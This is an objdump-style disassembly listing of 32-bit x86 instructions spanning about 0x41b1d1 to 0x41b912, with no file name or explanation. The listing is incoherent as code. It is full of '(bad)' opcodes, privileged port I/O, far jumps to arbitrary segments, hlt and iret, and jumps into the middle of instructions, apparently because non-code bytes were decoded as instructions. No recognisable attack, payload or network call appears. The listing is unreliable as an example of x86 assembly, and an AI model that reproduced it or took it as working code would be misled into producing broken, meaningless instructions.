  41b1d1:	sub    esp,DWORD PTR [ebx-0x24]
  41b1d4:	sbb    DWORD PTR [esi-0x2e734023],ecx
  41b1da:	push   0x3f
  41b1dc:	div    BYTE PTR [esi+0x314dab8e]
  41b1e2:	sub    BYTE PTR [esi+0x2aa11663],bl
  41b1e8:	fld    QWORD PTR [ebx-0x2cb2f768]
  41b1ee:	xor    edx,eax
  41b1f0:	in     eax,0xba
  41b1f2:	je     0x41b20a
  41b1f4:	push   edx
  41b1f5:	aaa    
  41b1f6:	push   edi
  41b1f7:	mov    dl,0x14
  41b1f9:	sub    eax,0x3012a508
  41b1fe:	rcr    DWORD PTR [edx],cl
  41b200:	leave  
  41b201:	(bad)  
  41b202:	xchg   ebx,eax
  41b203:	adc    eax,0xeaf11623
  41b208:	in     al,0xae
  41b20a:	les    edi,FWORD PTR [esp+eiz*4]
  41b20d:	mov    es,WORD PTR [edx]
  41b20f:	pop    edi
  41b210:	jmp    0x41b22d
  41b212:	clc    
  41b213:	daa    
  41b214:	out    0xa0,eax
  41b216:	int    0x56
  41b218:	rol    BYTE PTR [esi-0x58],cl
  41b21b:	jmp    0x531:0x4d359400
  41b222:	add    eax,0xd710ec44
  41b227:	or     DWORD PTR [ebx-0x5bf3413c],esi
  41b22d:	xchg   esi,eax
  41b22e:	xor    al,0x8e
  41b230:	loope  0x41b1bc
  41b232:	pop    es
  41b233:	inc    BYTE PTR [ebx+0x77f894dd]
  41b239:	and    eax,0x3f6393d3
  41b23e:	iret   
  41b23f:	cmp    edi,esi
  41b241:	cld    
  41b242:	jb     0x41b23f
  41b244:	jns    0x41b2a8
  41b246:	stos   BYTE PTR es:[edi],al
  41b247:	inc    esi
  41b248:	inc    ecx
  41b249:	inc    edi
  41b24a:	push   eax
  41b24b:	stos   DWORD PTR es:[edi],eax
  41b24c:	dec    ebp
  41b24d:	ret    
  41b24e:	mov    cl,0x27
  41b250:	aad    0x44
  41b252:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b253:	fwait
  41b254:	es in  al,dx
  41b256:	mov    ah,0xfc
  41b258:	pop    ecx
  41b259:	xor    eax,0x68a6df93
  41b25e:	mov    bh,0x97
  41b260:	and    ch,BYTE PTR [eax]
  41b262:	cmp    DWORD PTR ds:0xc5177184,eax
  41b268:	jmp    DWORD PTR [ecx-0x47]
  41b26b:	popf   
  41b26c:	dec    ebp
  41b26d:	call   0xe687:0x9b2fa501
  41b274:	sub    edi,DWORD PTR [ecx-0x40ff7f26]
  41b27a:	hlt    
  41b27b:	imul   BYTE PTR [ecx]
  41b27d:	jecxz  0x41b246
  41b27f:	cld    
  41b280:	test   BYTE PTR ds:0x6b5b0adc,0x42
  41b287:	dec    ch
  41b289:	in     al,0x17
  41b28b:	lods   al,BYTE PTR ds:[esi]
  41b28c:	lahf   
  41b28d:	sbb    eax,0xff603bf5
  41b292:	xchg   DWORD PTR [esi+eiz*2],esi
  41b295:	push   ss
  41b296:	jmp    0x3c29:0xe404b3f6
  41b29d:	sbb    DWORD PTR [edx],0xffffffc4
  41b2a0:	vfmsub213sd xmm5,xmm3,QWORD PTR [esi+0x23]
  41b2a6:	add    BYTE PTR [ecx+0x33],ah
  41b2a9:	ret    0x2f52
  41b2ac:	int3   
  41b2ad:	dec    esi
  41b2ae:	mov    bl,0x3e
  41b2b0:	sti    
  41b2b1:	xor    eax,ebp
  41b2b3:	test   al,0xf7
  41b2b5:	or     edx,DWORD PTR ss:[eax-0x3d9807ab]
  41b2bc:	push   0x7a
  41b2be:	gs jne 0x41b2b0
  41b2c1:	out    dx,eax
  41b2c2:	mov    ecx,0xa401967f
  41b2c7:	fldln2 
  41b2c9:	add    eax,0x59980d1a
  41b2ce:	push   esi
  41b2cf:	mov    eax,ds:0x4e733969
  41b2d4:	push   cs
  41b2d5:	loopne 0x41b31d
  41b2d7:	and    ah,BYTE PTR ds:0x281de844
  41b2dd:	fcmovnu st,st(6)
  41b2df:	stos   DWORD PTR es:[edi],eax
  41b2e0:	enter  0x6557,0x98
  41b2e4:	pop    ebp
  41b2e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b2e6:	add    bl,BYTE PTR [ebx]
  41b2e8:	xchg   DWORD PTR [eax-0x6505f264],ebx
  41b2ee:	jns    0x41b33a
  41b2f0:	and    al,0x1a
  41b2f2:	or     esi,esp
  41b2f4:	fmul   st,st(7)
  41b2f6:	sub    dh,bl
  41b2f8:	pop    es
  41b2f9:	gs push edi
  41b2fb:	cdq    
  41b2fc:	in     eax,dx
  41b2fd:	xchg   edi,eax
  41b2fe:	adc    BYTE PTR [eax-0x1d36d100],0xf0
  41b305:	push   ebp
  41b306:	ss ss stc 
  41b309:	pop    esp
  41b30a:	fucomip st,st(1)
  41b30c:	jecxz  0x41b33f
  41b30e:	in     al,dx
  41b30f:	dec    esi
  41b310:	or     eax,0xd37cdd56
  41b315:	clc    
  41b316:	add    DWORD PTR [edx+edx*2],0x62103444
  41b31d:	add    esi,ebp
  41b31f:	dec    edi
  41b320:	and    dh,bl
  41b322:	das    
  41b323:	(bad)  
  41b324:	jae    0x41b380
  41b326:	dec    ebx
  41b327:	enter  0x9d12,0xd9
  41b32b:	(bad)  
  41b32c:	sti    
  41b32d:	fs jp  0x41b2bb
  41b330:	sbb    BYTE PTR [ecx-0x59],al
  41b333:	ins    DWORD PTR es:[edi],dx
  41b334:	lock and esp,DWORD PTR [ebx-0x2]
  41b338:	sub    DWORD PTR [edi+0x72],esp
  41b33b:	sbb    eax,0xc0330088
  41b340:	and    eax,0x98eb45db
  41b345:	and    eax,0xad9b9027
  41b34a:	call   0x7246258d
  41b34f:	xchg   ebp,eax
  41b350:	(bad)  
  41b351:	xchg   esi,eax
  41b352:	jne    0x41b3b4
  41b354:	xor    esi,DWORD PTR [esi-0xb]
  41b357:	pop    esi
  41b358:	sub    al,0x4a
  41b35a:	and    BYTE PTR [ebx-0x7a],bl
  41b35d:	mov    edi,0xebbf6bdb
  41b362:	fimul  WORD PTR ds:0xa406fb52
  41b368:	mov    ch,BYTE PTR [ecx-0x76]
  41b36b:	imul   ebx,edi,0xd2150c26
  41b371:	pop    ecx
  41b372:	loope  0x41b3e7
  41b374:	push   ss
  41b375:	add    cl,al
  41b377:	sahf   
  41b378:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b379:	je     0x41b337
  41b37b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b37c:	rol    BYTE PTR [ecx+0x2d1839d4],cl
  41b382:	in     al,dx
  41b383:	neg    BYTE PTR [ecx]
  41b385:	jg     0x41b39d
  41b387:	add    DWORD PTR [edi+eiz*2+0x1],esp
  41b38b:	mov    eax,esi
  41b38d:	xchg   DWORD PTR [ebx-0x17],ebp
  41b390:	stc    
  41b391:	and    edx,DWORD PTR [edi-0x3f3a8076]
  41b397:	ficom  WORD PTR [ecx+eiz*4+0x46]
  41b39b:	pop    edx
  41b39c:	and    eax,0xbeaf6f6b
  41b3a1:	jg     0x41b335
  41b3a3:	jle    0x41b385
  41b3a5:	pop    ebp
  41b3a6:	push   cs
  41b3a7:	lock loopne 0x41b33f
  41b3aa:	push   edx
  41b3ab:	and    al,0xe4
  41b3ad:	out    dx,eax
  41b3ae:	cmp    ch,ah
  41b3b0:	jle    0x41b395
  41b3b2:	in     al,dx
  41b3b3:	xchg   esi,eax
  41b3b4:	repz sar al,0x81
  41b3b8:	ss in  al,dx
  41b3ba:	and    eax,0x3c6b56d4
  41b3bf:	bound  ecx,QWORD PTR [edi]
  41b3c1:	dec    eax
  41b3c2:	scas   al,BYTE PTR es:[edi]
  41b3c3:	add    BYTE PTR [ebp+0xa],dh
  41b3c6:	mov    eax,0x722cbd25
  41b3cb:	mov    BYTE PTR [ebx-0x7e],0x82
  41b3cf:	push   0x74
  41b3d1:	ja     0x41b3f1
  41b3d3:	aas    
  41b3d4:	pushf  
  41b3d5:	mov    esp,cs
  41b3d7:	into   
  41b3d8:	mov    dh,0xa0
  41b3da:	jg     0x41b3ac
  41b3dc:	xchg   edx,eax
  41b3dd:	sub    eax,0x3ade30dc
  41b3e2:	popf   
  41b3e3:	test   cl,bl
  41b3e5:	adc    DWORD PTR [edx-0x7385e79f],ebp
  41b3eb:	cli    
  41b3ec:	call   0xbc045991
  41b3f1:	dec    ecx
  41b3f2:	jmp    0x5034:0xbd9b57
  41b3f9:	imul   edi,DWORD PTR [edi-0x6361b80],0xffffffb9
  41b400:	or     ebx,DWORD PTR [edx+0x72bf09a9]
  41b406:	sub    edx,DWORD PTR [edx]
  41b408:	sbb    eax,0xd90f3d2b
  41b40d:	fdivr  QWORD PTR [esi-0x33e926ff]
  41b413:	and    bl,al
  41b415:	and    DWORD PTR [eax*1-0x197599dc],edx
  41b41c:	sub    cl,BYTE PTR [edx+0x6947b304]
  41b422:	and    DWORD PTR [esi-0xf],esi
  41b425:	push   esp
  41b426:	dec    eax
  41b427:	dec    esp
  41b428:	cmc    
  41b429:	in     eax,dx
  41b42a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b42b:	scas   al,BYTE PTR es:[edi]
  41b42c:	(bad)  
  41b42d:	adc    al,0xd7
  41b42f:	xor    BYTE PTR [ebp+0x78],0x95
  41b433:	jp     0x41b407
  41b435:	or     DWORD PTR [esi-0x69],eax
  41b438:	stos   DWORD PTR es:[edi],eax
  41b439:	mov    ecx,ecx
  41b43b:	fisttp DWORD PTR [edx+0x7e]
  41b43e:	lea    eax,[eax]
  41b440:	xchg   edi,eax
  41b441:	inc    ebp
  41b442:	retf   
  41b443:	push   ss
  41b444:	mov    ds:0x220df6c0,eax
  41b449:	jae    0x41b3f6
  41b44b:	mov    WORD PTR [ebx+0x7c],gs
  41b44e:	iret   
  41b44f:	lea    esi,[eax+edx*1]
  41b452:	jb     0x41b466
  41b454:	stos   DWORD PTR es:[edi],eax
  41b455:	bound  edx,QWORD PTR [ebx]
  41b457:	fmul   DWORD PTR [esi+0x31]
  41b45a:	loop   0x41b43a
  41b45c:	xlat   BYTE PTR ds:[ebx]
  41b45d:	icebp  
  41b45e:	cld    
  41b45f:	pop    ss
  41b460:	sbb    eax,0xa22e933f
  41b465:	push   ecx
  41b466:	shl    BYTE PTR [edx],0x71
  41b469:	shl    dh,1
  41b46b:	add    BYTE PTR [ebp-0x17],dl
  41b46e:	ret    
  41b46f:	es icebp 
  41b471:	in     al,0x50
  41b473:	sbb    bl,dl
  41b475:	xchg   esi,eax
  41b476:	(bad)  
  41b478:	out    0xe1,eax
  41b47a:	sbb    eax,0x46441a0f
  41b47f:	fmul   QWORD PTR [ebp+0x15]
  41b482:	hlt    
  41b483:	and    dh,dh
  41b485:	mov    WORD PTR [ecx+0x63808519],es
  41b48b:	(bad)  
  41b48c:	mov    ebp,0xdd199fb4
  41b491:	(bad)  
  41b492:	fdiv   DWORD PTR [ecx-0xf3232de]
  41b498:	cmc    
  41b499:	fdiv   QWORD PTR [ecx]
  41b49b:	push   edx
  41b49c:	test   eax,0x203e13
  41b4a1:	xor    DWORD PTR [ebp+ebp*1+0x7ee5b7c],0x87ecbfaf
  41b4ac:	lds    ebp,FWORD PTR [ecx+0x13]
  41b4af:	(bad)  
  41b4b0:	sti    
  41b4b1:	xor    cl,BYTE PTR [ebx+0x20ee7ca9]
  41b4b7:	mov    ebp,0xefb05476
  41b4bc:	aaa    
  41b4bd:	dec    DWORD PTR [edi-0x5b]
  41b4c0:	pusha  
  41b4c1:	xor    DWORD PTR [ebx+0xe],eax
  41b4c4:	mov    BYTE PTR [edx-0x61],cl
  41b4c7:	lods   al,BYTE PTR ds:[si]
  41b4c9:	push   ebx
  41b4ca:	sbb    al,0x92
  41b4cc:	lds    eax,FWORD PTR [eax-0x2348559a]
  41b4d2:	dec    esp
  41b4d3:	jle    0x41b488
  41b4d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b4d6:	hlt    
  41b4d7:	xor    al,0x72
  41b4d9:	mov    esi,gs
  41b4db:	sub    ebp,DWORD PTR ds:0x713dbfb3
  41b4e1:	mov    al,ds:0xae966086
  41b4e6:	mov    ds:0xc2daef0b,al
  41b4eb:	ret    
  41b4ec:	dec    ecx
  41b4ed:	push   ebx
  41b4ee:	mov    ch,0x5a
  41b4f0:	sbb    DWORD PTR [eax-0x47],ecx
  41b4f3:	inc    esi
  41b4f4:	sub    edi,DWORD PTR [edx-0x1ca621ec]
  41b4fa:	push   0x848b013e
  41b4ff:	xor    DWORD PTR [ebp+0x6416a89b],edi
  41b505:	push   ds
  41b506:	push   es
  41b507:	cdq    
  41b508:	push   edx
  41b509:	mov    bl,BYTE PTR [eax-0x3b]
  41b50c:	jle    0x41b54b
  41b50e:	push   edx
  41b50f:	mov    ds:0x17fdfac9,al
  41b514:	push   eax
  41b515:	jl     0x41b4d3
  41b517:	sbb    dl,BYTE PTR [ebp+esi*2-0x6c]
  41b51b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b51c:	cdq    
  41b51d:	and    esp,edx
  41b51f:	mov    al,0x93
  41b521:	mov    eax,ds:0x486f3179
  41b526:	cmp    ecx,DWORD PTR ds:0xb8f86d8e
  41b52c:	call   0x9daee3d5
  41b531:	jmp    0x5381734e
  41b536:	ficomp WORD PTR [ecx]
  41b538:	mov    al,0xac
  41b53a:	sbb    eax,DWORD PTR [ecx-0x69628c9]
  41b540:	mov    eax,ds:0x9f5f9a74
  41b545:	mov    esp,0xc1022979
  41b54a:	loopne 0x41b4ff
  41b54c:	dec    edi
  41b54d:	pop    ds
  41b54e:	jmp    0x41b520
  41b550:	add    al,0x82
  41b552:	and    eax,eax
  41b554:	inc    eax
  41b555:	push   ebp
  41b556:	push   edx
  41b557:	clc    
  41b558:	rol    bl,1
  41b55a:	jbe    0x41b5bd
  41b55c:	push   0xffffff89
  41b55e:	fidivr WORD PTR [ebx-0x30]
  41b561:	outs   dx,DWORD PTR ds:[esi]
  41b562:	sbb    dh,BYTE PTR [edi+0x6f48f4e6]
  41b568:	sbb    bh,dh
  41b56a:	jmp    0xbdf20034
  41b56f:	shl    DWORD PTR [edx-0x38],0x97
  41b573:	pop    eax
  41b574:	lea    di,[esi+eax*4+0x0]
  41b579:	mov    dh,bh
  41b57b:	xor    DWORD PTR [ecx],0x55f4854b
  41b581:	ss mov eax,0x15de445a
  41b587:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b588:	sbb    BYTE PTR [ecx+0x595470e5],dl
  41b58e:	repz cmp BYTE PTR [eax],dl
  41b591:	cmp    eax,0xf0938d44
  41b596:	ins    BYTE PTR es:[edi],dx
  41b597:	stos   DWORD PTR es:[edi],eax
  41b598:	pop    es
  41b599:	sub    eax,0xecb9d1c3
  41b59e:	ins    DWORD PTR es:[edi],dx
  41b59f:	add    DWORD PTR [ebp+0x3ac419a0],esi
  41b5a5:	jae    0x41b5dc
  41b5a7:	mov    ecx,0x281a5940
  41b5ac:	sbb    ah,cl
  41b5ae:	in     eax,dx
  41b5af:	xchg   edi,eax
  41b5b0:	and    bl,bh
  41b5b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b5b3:	fdivr  st(0),st
  41b5b5:	iret   
  41b5b6:	sbb    DWORD PTR [esi],ebx
  41b5b8:	dec    ebx
  41b5b9:	add    esp,DWORD PTR [esi+0x58779b79]
  41b5bf:	or     cl,dh
  41b5c1:	inc    eax
  41b5c2:	or     al,0xd0
  41b5c4:	stos   BYTE PTR es:[edi],al
  41b5c5:	sbb    cl,BYTE PTR [ebp+ecx*2-0x7da096b3]
  41b5cc:	fcmovne st,st(2)
  41b5ce:	push   edi
  41b5cf:	stos   DWORD PTR es:[edi],eax
  41b5d0:	jge    0x41b596
  41b5d2:	arpl   sp,si
  41b5d4:	into   
  41b5d5:	pop    esp
  41b5d6:	lea    esi,[ebp+0x243be23d]
  41b5dc:	xor    eax,0x8a1f6b3b
  41b5e1:	mov    esp,0x3c337905
  41b5e6:	dec    ecx
  41b5e7:	pop    ecx
  41b5e8:	(bad)  
  41b5e9:	rol    BYTE PTR [ebp-0x5081e4fb],1
  41b5ef:	jnp    0x41b5f5
  41b5f1:	cmc    
  41b5f2:	jbe    0x41b58b
  41b5f4:	push   esi
  41b5f5:	jo     0x41b5a7
  41b5f7:	nop
  41b5f8:	outs   dx,DWORD PTR ds:[esi]
  41b5f9:	jl     0x41b5e5
  41b5fb:	adc    eax,0x72e2901a
  41b600:	sbb    DWORD PTR [ebx],ebp
  41b602:	xor    ebx,DWORD PTR [esi]
  41b604:	inc    eax
  41b605:	loope  0x41b60e
  41b607:	scas   al,BYTE PTR es:[edi]
  41b608:	mov    esp,0x52eb4226
  41b60d:	cmp    al,0xf3
  41b60f:	mov    WORD PTR [edx-0x55],?
  41b612:	pusha  
  41b613:	inc    ebx
  41b614:	mov    esi,0x6106cc17
  41b619:	mov    ecx,0xc558b9f
  41b61e:	sahf   
  41b61f:	jle    0x41b620
  41b621:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b622:	in     eax,dx
  41b623:	cmp    bl,BYTE PTR [edi]
  41b625:	jl     0x41b65f
  41b627:	sub    ebx,DWORD PTR [esi]
  41b629:	retf   0xd4c
  41b62c:	mov    eax,0xb1a527fb
  41b631:	in     eax,dx
  41b632:	lods   al,BYTE PTR ds:[esi]
  41b633:	mov    eax,ds:0xce376bd4
  41b638:	repnz sbb eax,esp
  41b63b:	add    ebx,DWORD PTR [ebp-0x1f]
  41b63e:	aaa    
  41b63f:	stos   DWORD PTR es:[edi],eax
  41b640:	pop    ecx
  41b641:	dec    eax
  41b642:	inc    ecx
  41b643:	sub    BYTE PTR [esi+0x2b66bee3],bl
  41b649:	jb     0x41b66b
  41b64b:	xchg   esp,eax
  41b64c:	mov    eax,ds:0x50cc04c1
  41b651:	jg     0x41b604
  41b653:	enter  0x5d9f,0xec
  41b657:	push   esp
  41b658:	clc    
  41b659:	pop    esi
  41b65a:	cmp    BYTE PTR [ebx-0x3db7b2f3],dh
  41b660:	fisub  WORD PTR [ebx]
  41b662:	add    al,0xfd
  41b664:	mov    al,ds:0x5c2ee7cd
  41b669:	sbb    eax,0x72f7d6ac
  41b66e:	pop    esp
  41b66f:	fimul  DWORD PTR [edi+eiz*2-0x24]
  41b673:	sub    al,0x8f
  41b675:	jle    0x41b681
  41b677:	pop    edx
  41b678:	and    eax,0x72886c30
  41b67d:	popf   
  41b67e:	adc    DWORD PTR [esi-0x2b],edi
  41b681:	shr    BYTE PTR [ecx],1
  41b683:	sahf   
  41b684:	pop    ecx
  41b685:	into   
  41b686:	lods   eax,DWORD PTR ds:[esi]
  41b687:	jp     0x41b60a
  41b689:	popf   
  41b68a:	inc    esp
  41b68b:	push   edx
  41b68c:	mov    ds:0xf791ba7d,eax
  41b691:	retf   0x67a5
  41b694:	loop   0x41b63e
  41b696:	mov    WORD PTR [edi+edx*1+0x639f1154],gs
  41b69d:	shl    esi,0x4d
  41b6a0:	push   ebx
  41b6a1:	imul   esp,DWORD PTR [eax+0x88d6dc],0xffffff9b
  41b6a8:	xchg   ebx,eax
  41b6a9:	enter  0x8c1d,0x4a
  41b6ad:	push   edx
  41b6ae:	add    DWORD PTR ds:0x87d23fdc,edi
  41b6b4:	neg    edi
  41b6b6:	jmp    0x41b681
  41b6b8:	mov    edi,0x7a65141b
  41b6bd:	add    al,0xa2
  41b6bf:	sbb    al,0xf7
  41b6c1:	std    
  41b6c2:	add    BYTE PTR [eax],al
  41b6c4:	enter  0xb9a2,0x66
  41b6c8:	popa   
  41b6c9:	repz xchg ebx,eax
  41b6cb:	popa   
  41b6cc:	mov    cl,0xf7
  41b6ce:	sub    ecx,edi
  41b6d0:	mov    esp,0x17c7f09f
  41b6d5:	outs   dx,BYTE PTR ds:[esi]
  41b6d6:	enter  0xbadd,0xb
  41b6da:	lds    ebp,FWORD PTR [edx+0x3eb963b5]
  41b6e0:	ins    BYTE PTR es:[edi],dx
  41b6e1:	sar    BYTE PTR [eax+ebp*4+0x4b],0xf7
  41b6e6:	in     al,dx
  41b6e7:	std    
  41b6e8:	jmp    0xa2a6d9e6
  41b6ed:	ret    
  41b6ee:	ss (bad) 
  41b6f0:	cwde   
  41b6f1:	addr16 cmc 
  41b6f3:	addr16 push ebp
  41b6f5:	pop    ebx
  41b6f6:	mov    ds:0x53e735b0,al
  41b6fb:	push   edx
  41b6fc:	push   cs
  41b6fd:	ss jl  0x41b718
  41b700:	inc    esp
  41b701:	adc    ecx,ecx
  41b703:	(bad)  
  41b704:	cld    
  41b705:	repnz xlat BYTE PTR ds:[ebx]
  41b707:	jmp    0x94728398
  41b70c:	lea    ebx,[esi-0x18]
  41b70f:	sub    ecx,ecx
  41b711:	lods   eax,DWORD PTR ds:[esi]
  41b712:	push   eax
  41b713:	xchg   esi,eax
  41b714:	and    esp,DWORD PTR [edx]
  41b716:	mov    dh,0xbf
  41b718:	xor    DWORD PTR ds:0x8e3f88c1,ebx
  41b71e:	ss mov ecx,0x20f91f3
  41b724:	dec    ebp
  41b725:	mov    edx,0xec2278ad
  41b72a:	fild   WORD PTR [esi]
  41b72c:	xchg   edi,eax
  41b72d:	dec    edi
  41b72e:	push   esi
  41b72f:	push   esi
  41b730:	cmp    dl,cl
  41b732:	inc    edi
  41b733:	pop    edx
  41b734:	std    
  41b735:	int    0xd9
  41b737:	sti    
  41b738:	jmp    0x97993acb
  41b73d:	push   ebx
  41b73e:	mov    ebx,ebx
  41b740:	xchg   ecx,eax
  41b741:	mov    bh,dl
  41b743:	popf   
  41b744:	fmul   QWORD PTR [ebp+0x1d]
  41b747:	xchg   edx,eax
  41b748:	add    ah,ah
  41b74a:	sub    DWORD PTR [esi+edx*4+0x71],0x78
  41b74f:	hlt    
  41b750:	repnz add bh,al
  41b753:	sub    dl,BYTE PTR [edi]
  41b755:	pop    ecx
  41b756:	and    eax,0xc3c07b19
  41b75b:	dec    edi
  41b75c:	dec    esi
  41b75d:	rcl    DWORD PTR [eax+0x3b],1
  41b760:	sub    eax,0x6b953f2
  41b765:	push   edx
  41b766:	xchg   ebx,eax
  41b767:	ret    0xe6dc
  41b76a:	and    al,BYTE PTR [ecx]
  41b76c:	fisubr DWORD PTR [ebx]
  41b76e:	cld    
  41b76f:	je     0x41b725
  41b771:	inc    edi
  41b772:	or     bl,dl
  41b774:	(bad)  [edi-0xd]
  41b777:	(bad)  
  41b778:	mov    bx,0xb0a8
  41b77c:	jmp    0xa78c440b
  41b781:	xor    DWORD PTR [edi+0x3d],0x50
  41b785:	jbe    0x41b73b
  41b787:	inc    esi
  41b788:	lea    edi,ss:[esi+0x14]
  41b78c:	xchg   ebx,eax
  41b78d:	push   ebp
  41b78e:	fst    DWORD PTR [esi+0x32]
  41b791:	adc    esi,DWORD PTR gs:[eax-0x2a0609c1]
  41b798:	mov    BYTE PTR ds:0x85237a0e,al
  41b79e:	outs   dx,BYTE PTR ds:[esi]
  41b79f:	out    0xbf,eax
  41b7a1:	pop    esp
  41b7a2:	inc    esi
  41b7a3:	inc    DWORD PTR [edi]
  41b7a5:	push   edi
  41b7a6:	jl     0x41b811
  41b7a8:	dec    edi
  41b7a9:	test   DWORD PTR ds:0xd515c69d,ebp
  41b7af:	inc    esi
  41b7b0:	js     0x41b771
  41b7b2:	or     al,0xe5
  41b7b4:	or     BYTE PTR fs:[edx+0x71061d27],ah
  41b7bb:	repnz dec esi
  41b7bd:	jg     0x41b76b
  41b7bf:	bound  esp,QWORD PTR [ecx]
  41b7c1:	jge    0x41b75d
  41b7c3:	rol    BYTE PTR [ecx+0x11],0xd2
  41b7c7:	push   edi
  41b7c8:	(bad)  
  41b7c9:	cwde   
  41b7ca:	jb     0x41b7b0
  41b7cc:	add    DWORD PTR [eax],esp
  41b7ce:	ds sbb al,0x28
  41b7d1:	test   DWORD PTR [esi],edx
  41b7d3:	outs   dx,DWORD PTR ds:[esi]
  41b7d4:	sbb    edx,DWORD PTR [edx]
  41b7d6:	in     al,0xaf
  41b7d8:	adc    dh,cl
  41b7da:	push   eax
  41b7db:	sbb    esp,DWORD PTR [edi+0x11]
  41b7de:	outs   dx,BYTE PTR ds:[esi]
  41b7df:	mov    cl,0x92
  41b7e1:	jbe    0x41b82d
  41b7e3:	dec    edi
  41b7e4:	inc    esp
  41b7e5:	repz ret 
  41b7e7:	dec    eax
  41b7e8:	inc    edi
  41b7e9:	lods   eax,DWORD PTR ds:[esi]
  41b7ea:	jo     0x41b83c
  41b7ec:	bound  ebp,QWORD PTR [ebx-0x7ed262c0]
  41b7f2:	xor    cl,bh
  41b7f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b7f5:	push   ds
  41b7f6:	jmp    0x41b7f1
  41b7f8:	frstor [ebx]
  41b7fa:	lods   eax,DWORD PTR ds:[esi]
  41b7fb:	and    BYTE PTR [esi-0x90c3d17],cl
  41b801:	pop    es
  41b802:	pop    esi
  41b803:	int3   
  41b804:	adc    ch,BYTE PTR [ebx+0xc]
  41b807:	mov    gs,edx
  41b809:	push   es
  41b80a:	lea    edx,[eax]
  41b80c:	pop    esi
  41b80d:	sub    edx,ebp
  41b80f:	stos   DWORD PTR es:[edi],eax
  41b810:	(bad)  
  41b811:	jecxz  0x41b842
  41b813:	adc    dl,dl
  41b815:	aaa    
  41b816:	or     al,0xf0
  41b818:	pop    edi
  41b819:	pop    edi
  41b81a:	fcomp  DWORD PTR [ebx+0x6c]
  41b81d:	inc    ebx
  41b81e:	(bad)  
  41b81f:	call   ebx
  41b821:	sub    BYTE PTR [edi],bh
  41b823:	lods   eax,DWORD PTR ds:[esi]
  41b824:	cli    
  41b825:	mov    cl,0x4f
  41b827:	rcr    BYTE PTR [ebx],1
  41b829:	xor    al,0x85
  41b82b:	inc    ebp
  41b82c:	fsub   DWORD PTR [esi+esi*2+0x65c39bd5]
  41b833:	or     BYTE PTR [eax],dh
  41b835:	in     al,dx
  41b836:	dec    esi
  41b837:	aad    0x59
  41b839:	jns    0x41b7c6
  41b83b:	or     esp,esp
  41b83d:	sub    BYTE PTR [esi],al
  41b83f:	sbb    ebx,DWORD PTR [eax-0x13a6e307]
  41b845:	sbb    al,0x8b
  41b847:	stc    
  41b848:	ret    
  41b849:	jne    0x41b890
  41b84b:	call   0x52f06d7e
  41b850:	pop    es
  41b851:	push   ecx
  41b852:	repz scas al,BYTE PTR es:[edi]
  41b854:	pop    ds
  41b855:	adc    ebx,ebx
  41b857:	ja     0x41b8ce
  41b859:	outs   dx,DWORD PTR ds:[esi]
  41b85a:	es sbb ebp,edx
  41b85d:	fadd   st,st(4)
  41b85f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b860:	mov    ebx,0xad4f1105
  41b865:	ror    DWORD PTR [esp+ebx*8-0x4],0x3f
  41b86a:	inc    ebx
  41b86b:	adc    BYTE PTR [esi+0x27],ah
  41b86e:	daa    
  41b86f:	cld    
  41b870:	jle    0x41b8a4
  41b872:	push   edx
  41b873:	pop    ebx
  41b874:	stos   DWORD PTR es:[edi],eax
  41b875:	daa    
  41b876:	adc    eax,0x8037a050
  41b87b:	xchg   esi,eax
  41b87c:	mov    al,BYTE PTR [ecx+edi*2]
  41b87f:	cmp    ebx,ebx
  41b881:	pushf  
  41b882:	mov    eax,DWORD PTR [ebp+0x6f]
  41b885:	xchg   edi,eax
  41b886:	adc    BYTE PTR [ecx],dh
  41b888:	fisub  DWORD PTR [ecx-0x204bc1c0]
  41b88e:	pop    edi
  41b88f:	loopne 0x41b899
  41b891:	cmp    eax,0xb4982807
  41b896:	mov    edx,0xa002cfca
  41b89b:	popa   
  41b89c:	lods   al,BYTE PTR ds:[esi]
  41b89d:	jl     0x41b895
  41b89f:	fild   DWORD PTR [ebx-0x1d865941]
  41b8a5:	jmp    0x41b875
  41b8a7:	mov    bh,0xd9
  41b8a9:	sbb    ecx,esp
  41b8ab:	into   
  41b8ac:	pop    ebp
  41b8ad:	scas   eax,DWORD PTR es:[edi]
  41b8ae:	dec    edi
  41b8af:	das    
  41b8b0:	scas   eax,DWORD PTR es:[edi]
  41b8b1:	je     0x41b86c
  41b8b3:	loopne 0x41b920
  41b8b5:	add    eax,eax
  41b8b7:	xchg   ch,bl
  41b8b9:	mov    ch,0xd9
  41b8bb:	mov    esi,0xc28fbcec
  41b8c0:	(bad)  
  41b8c1:	mov    edi,0x8b036446
  41b8c6:	fincstp 
  41b8c8:	jecxz  0x41b8cf
  41b8ca:	add    DWORD PTR [edx+0x60],esp
  41b8cd:	mov    BYTE PTR [edx],bl
  41b8cf:	push   es
  41b8d0:	mov    ds:0x12ba8446,eax
  41b8d5:	(bad)  
  41b8d6:	outs   dx,DWORD PTR ds:[esi]
  41b8d7:	sub    eax,0x2b0fb4fb
  41b8dc:	fincstp 
  41b8de:	and    al,0x1b
  41b8e0:	scas   eax,DWORD PTR es:[edi]
  41b8e1:	loop   0x41b8db
  41b8e3:	sub    ecx,edi
  41b8e5:	mov    eax,ds:0x36373015
  41b8ea:	mov    dl,BYTE PTR ds:0xbf1a45c0
  41b8f0:	sar    BYTE PTR [ebp-0x1edc6f11],cl
  41b8f6:	jle    0x41b8ed
  41b8f8:	fwait
  41b8f9:	mov    edi,DWORD PTR [esi+0x53]
  41b8fc:	jo     0x41b8b5
  41b8fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b8ff:	lods   eax,DWORD PTR ds:[esi]
  41b900:	out    dx,al
  41b901:	pop    ecx
  41b902:	test   edi,esp
  41b904:	cli    
  41b905:	nop
  41b906:	sub    eax,0xc849149e
  41b90b:	sahf   
  41b90c:	fnstsw WORD PTR [ecx+0x58796b2b]
  41b912:	lds    esi,FWORD PTR [edx-0x30deb064]
